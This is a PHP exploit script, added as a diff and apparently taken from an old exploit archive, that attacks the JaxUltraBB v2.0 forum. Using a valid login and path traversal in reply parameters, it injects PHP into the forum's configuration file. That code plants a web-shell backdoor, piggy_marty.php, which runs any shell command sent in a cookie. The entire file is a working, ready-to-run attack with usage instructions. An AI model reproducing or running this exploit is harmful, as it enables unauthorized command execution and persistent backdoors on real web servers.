@@ -1,0 +1,203 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "JaxUltraBB v2.0 Topic Reply Command Execution Exploit\r\n";
+echo "by BlackHawk <hawkgotyou@gmail.com>\r\n";
+echo "Thanks to rgod for the php code and Marty for the Love\r\n";
+echo "You need a valid Username and Password to get it working\r\n\r\n";
+echo "This exploit will try to create a piggy_marty.php backdoor on the webserver\r\n\r\n";
+
+if ($argc<4) {
+echo "Usage: php ".$argv[0]." Site Path UserName Password CMD\r\n";
+echo "Host:       target server (ip/hostname)\r\n";
+echo "Path:       path to PhpBB\r\n";
+echo "Username:        Your username\r\n";
+echo "Password:        Your Password\r\n";
+echo "CMD:        A shell command\r\n";
+echo "Example:\r\n";
+echo "php ".$argv[0]." localhost /jubb/ admin admin dir C:\\\r\n";
+die;
+}
+
+/*
+Jubb is a quite insecure board..
+No XSS prevention, free view MD5 hash of the users passwords and more..
+
+after the DevilTeam Deface Exploit something more usefull ;)
+
+JUBB save all the topics into small files with the same exstensions,
+even the forumdata.JaxSQL wich contains all the forum configuration variables;
+
+nothing easyer than append some PHP code into the configuration file and execute it;
+
+this exploit create a piggy_marty.php backdoor, wich you can use directly running again the program;
+
+sorry for my bad english, 
+
+BlackHawk hawkgotyou@gmail.com
+*/
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$uname=$argv[3];
+$password=$argv[4];
+$port=80;
+$proxy="";
+$cmd="";
+for ($i=5; $i<=$argc-1; $i++){
+$cmd.=" ".$argv[$i];
+}
+$cmd=urlencode($cmd);
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+// Check if backdoor already exist
+
+echo "Step 0 - Check if piggy_marty.php already exist..\r\n";
+$packet ="GET ".$p."piggy_marty.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: cmd=".$cmd.";\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+if (strstr($html,"69696"))
+{
+  echo "Exploit succeeded...\r\n";
+  $temp=explode("69696",$html);
+  die("\r\n".$temp[1]."\r\n");
+}
+
+// Do the Login..
+
+echo "Step 1 - Try To Do The Login..\r\n";
+$data="username=$uname";
+$data.="&password=$password";
+$data.="&submit=Login";
+$packet="POST ".$p."login.php HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
+$packet.="Referer: http://".$host.$path."/login.php\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+$temp=explode("Set-Cookie: ",$html);
+$temp2=explode(" ",$temp[1]);
+$phpsid = $temp2[0];
+
+// Send The Evil Code
+
+echo "Step 2 - Ok, Now Injecting the Shell..\r\n";
+$data="subject=";
+$data.="&message=<?php \$fp=fopen(\"piggy_marty.php\",\"w\");fputs(\$fp,\"<?php error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()) {\\\$_COOKIE[cmd]=stripslashes(\$_COOKIE[cmd]);}echo 69696;passthru(\\\$_COOKIE[cmd]);echo 69696;?>\");fclose(\$fp);chmod(\"piggy_marty.php\",777);?>";
+$packet="POST ".$p."post.php?action=reply&forum=../forum&topic=data HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
+$packet.="Referer: http://".$host.$path."/login.php\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n";
+$packet.="Cookie: ".$phpsid."\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+
+$packet="GET ".$p."index.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+sleep(1);
+
+echo "Step 3 - Restoring the original File..\r\n";
+$data="subject=";
+$data.="&message=<?php \$fp=fopen(\"forumdata.JaxSql\",\"w\");fputs(\$fp,\"<?php\r\n\\\$setup = \$setup;\\\$forumname = \\\"\$forumname\\\";\\\$adminemail = \\\"\$adminemail\\\";\\\$hot_post_count = \$hot_post_count;\\\$rules = \\\"\$rules\\\";echo \\\"<html><body bgColor='black' background='img/background.jpg' text='white'><title>\\\$forumname -- Index</title><style>a { text-decoration: none; color: blue }a:visited { color: gray }a:hover { text-decoration: bold; color: red }</style><table><td background='img/topbar.jpg' width='1000' height='100'><img src='img/logo.jpg' width='300' height='100'></td></table><a href='index.php'><img src='img/homeicon.jpg' style='border: outset; border-color: black'>Home</a> <a href='members.php'><img src='img/membersicon.jpg' style='border: outset; border-color: black'>Members</a>\\\";if (\\\$_SESSION['usr'] == \\\"\\\") {echo \\\"<a href='register.php'><img src='img/registericon.jpg' style='border: outset; border-color: black'>Register</a> \\\";echo \\\" <a href='login.php'><img src='img/loginicon.jpg' style='border: outset; border-color: black'>Login</a>\\\";} else {echo \\\" <a href='profile.php'><img src='img/profile.jpg' style='border: outset; border-color: black'>Profile</a>\\\";echo \\\" <a href='login.php?logout=true'><img src='img/loginicon.jpg' style='border: outset; border-color: black'>Logout of \\\".\\\$_SESSION['usr'].\\\"</a><br>\\\";}function online_moved(\\\$page){\\\$onlinefile = fopen(\\\"users/\\\".\\\$_SESSION['usr'].\\\"online.JaxSQL\\\", \\\"w\\\");fwrite(\\\$onlinefile, \\\$page.\\\"{DATA}\\\".date(\\\"m\\\").\\\"{DATA}\\\".date(\\\"d\\\").\\\"{DATA}\\\".date(\\\"y\\\").\\\"{DATA}\\\".date(\\\"h\\\").\\\"{DATA}\\\".date(\\\"i\\\").\\\"{DATA}\\\".date(\\\"s\\\"));fclose(\\\$onlinefile);}?>\");fclose(\$fp);chmod(\"marty.php\",777);?>";
+$packet="POST ".$p."post.php?action=reply&forum=../forum&topic=data HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
+$packet.="Referer: http://".$host.$path."/login.php\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n";
+$packet.="Cookie: ".$phpsid."\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+
+$packet="GET ".$p."index.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+sleep(1);
+
+echo "Step 4 - All done.. Restart the exploit to enjoy ^_^\r\n";
+?>
+
+# milw0rm.com [2006-10-24]
